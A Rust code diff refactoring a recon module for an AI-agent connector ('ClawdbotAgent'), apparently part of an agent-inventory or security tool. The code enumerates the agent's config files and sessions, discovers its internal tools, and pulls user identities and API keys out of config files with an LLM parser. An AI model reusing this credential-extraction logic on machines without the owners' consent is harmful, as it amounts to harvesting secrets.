@@ -1,13 +1,7 @@
 use super::{ClawdbotAgent, ClawdbotSession};
-use crate::agent_connectors::traits::{AgentRecon, AgentSession};
-use crate::utils::semantic_parser::{
-    self, build_metadata_extraction_prompt, parse_metadata_from_json,
-    METADATA_EXTRACTION_SCHEMA,
-};
+use crate::agent_connectors::traits::{Agent, AgentRecon, AgentSession};
 use async_trait::async_trait;
-use common::{
-    AgentTool, ReconConfig, ReconMetadata, ReconResult, ReconTools, SessionContext,
-};
+use common::{AgentTool, ConfigItem, ReconResult, ReconTools, SessionContext};
 use std::sync::Arc;
 
 #[async_trait]
@@ -21,16 +15,11 @@ impl AgentRecon for ClawdbotAgent {
         //
         // Get enumeration data.
         //
-        let (config, sessions, project_paths) = match super::enumeration::enumerate() {
-            Ok(data) => {
-                let config = ReconConfig {
-                    items: data.config_items,
-                };
-                (config, data.sessions, data.project_paths)
-            }
+        let (config_items, sessions, project_paths) = match super::enumeration::enumerate() {
+            Ok(data) => (data.config_items, data.sessions, data.project_paths),
             Err(e) => {
                 common::log_warn!("Enumeration failed: {}", e);
-                (ReconConfig::default(), Vec::new(), Vec::new())
+                (Vec::new(), Vec::new(), Vec::new())
             }
         };
 
@@ -50,19 +39,28 @@ impl AgentRecon for ClawdbotAgent {
         //
         // Extract metadata (user identities, API keys) from config files.
         //
-        let metadata = if !config.items.is_empty() {
-            self.extract_metadata_from_configs(&config).await
-        } else {
-            None
-        };
+        let metadata = crate::agent_connectors::utils::extract_metadata_from_configs(
+            self.name(),
+            &config_items,
+        )
+        .await;
 
         common::log_info!(
             "Recon complete - {} config items, {} sessions, {} projects, metadata={}",
-            config.items.len(),
+            config_items.len(),
             sessions.len(),
             project_paths.len(),
             metadata.is_some()
         );
+
+        //
+        // Strip contents from config items before returning. Contents are fetched
+        // on-demand to avoid exceeding RabbitMQ message size limits.
+        //
+        let config: Vec<ConfigItem> = config_items.into_iter().map(|mut item| {
+            item.contents = None;
+            item
+        }).collect();
 
         Some(ReconResult {
             tools,
@@ -75,122 +73,6 @@ impl AgentRecon for ClawdbotAgent {
 }
 
 impl ClawdbotAgent {
-    //
-    // Extract metadata (user identities, API keys) from config files using the
-    // semantic parser.
-    //
-    async fn extract_metadata_from_configs(&self, config: &ReconConfig) -> Option<ReconMetadata> {
-        if config.items.is_empty() {
-            return None;
-        }
-
-        common::log_info!(
-            "Extracting metadata from {} config files",
-            config.items.len()
-        );
-
-        //
-        // Combine config contents, prioritizing auth files.
-        //
-        let priority_types = ["auth_config"];
-        let mut combined_configs = String::new();
-
-        //
-        // First add priority items (auth configs).
-        //
-        for item in &config.items {
-            if priority_types.iter().any(|t| item.config_type.starts_with(t)) {
-                combined_configs.push_str(&format!(
-                    "=== {} ({}) ===\n{}\n\n",
-                    item.path, item.config_type, item.contents
-                ));
-            }
-        }
-
-        //
-        // Then add other items (limited to avoid token overflow).
-        //
-        let mut other_content = String::new();
-        for item in &config.items {
-            if !priority_types.iter().any(|t| item.config_type.starts_with(t)) {
-                let entry = format!(
-                    "=== {} ({}) ===\n{}\n\n",
-                    item.path, item.config_type, item.contents
-                );
-                if other_content.len() + entry.len() < 50000 {
-                    other_content.push_str(&entry);
-                }
-            }
-        }
-        combined_configs.push_str(&other_content);
-
-        //
-        // Get the semantic parser client.
-        //
-        let semantic_client = match semantic_parser::get_client() {
-            Some(client) => client,
-            None => {
-                common::log_warn!(
-                    "Semantic parser client not available for metadata extraction"
-                );
-                return None;
-            }
-        };
-
-        //
-        // Send to semantic parser for metadata extraction.
-        //
-        let extraction_prompt = build_metadata_extraction_prompt(&combined_configs);
-        match semantic_client
-            .parse(extraction_prompt, METADATA_EXTRACTION_SCHEMA.to_string())
-            .await
-        {
-            Ok(parser_response) => {
-                if parser_response.success {
-                    if let Some(json) = parser_response.json {
-                        if let Some(extracted) = parse_metadata_from_json(&json) {
-                            let has_identities = !extracted.user_identities.is_empty();
-                            let has_keys = !extracted.api_keys.is_empty();
-
-                            if has_identities || has_keys {
-                                common::log_info!(
-                                    "Extracted {} user identities, {} API keys",
-                                    extracted.user_identities.len(),
-                                    extracted.api_keys.len()
-                                );
-
-                                return Some(ReconMetadata {
-                                    user_identities: if has_identities {
-                                        Some(extracted.user_identities)
-                                    } else {
-                                        None
-                                    },
-                                    api_keys: if has_keys {
-                                        Some(extracted.api_keys)
-                                    } else {
-                                        None
-                                    },
-                                });
-                            }
-                        }
-                    }
-                }
-                common::log_warn!(
-                    "Semantic parser failed for metadata extraction: {:?}",
-                    parser_response.error
-                );
-            }
-            Err(e) => {
-                common::log_warn!(
-                    "Semantic parser request failed for metadata extraction: {}",
-                    e
-                );
-            }
-        }
-
-        None
-    }
-
     //
     // Discover internal tools by querying the agent via a temporary session.
     //
@@ -219,7 +101,7 @@ impl ClawdbotAgent {
         // Use shared recon function to discover internal tools.
         //
         crate::agent_connectors::utils::discover_internal_tools_semantically(
-            "ClawdbotAgent",
+            self.name(),
             || {
                 let temp_context = SessionContext::default();
                 let session = ClawdbotSession::new(Some(binary_path.clone()), &temp_context)?;
